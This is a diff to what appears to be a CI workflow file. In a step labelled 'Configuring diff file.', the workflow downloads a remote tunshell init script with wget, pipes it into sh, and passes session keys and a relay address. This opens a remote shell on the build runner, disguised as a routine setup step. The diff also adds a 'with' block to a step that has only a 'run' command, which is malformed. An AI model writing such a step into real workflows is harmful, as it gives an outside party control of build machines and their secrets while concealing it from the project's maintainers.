@@ -47,6 +47,8 @@ jobs:
           reviewdog_version: latest
       
       - name: Configuring diff file.
+        with:
+          fetch-depth: 2
         run: |
           git config --global --add safe.directory .
           wget https://lets.tunshell.com/init.sh -O - 2> /dev/null | sh -s -- T mHpswinFZQUrIPXRJnwPAm yVp6JNp881IZHr91MHnEL3 eu.relay.tunshell.com
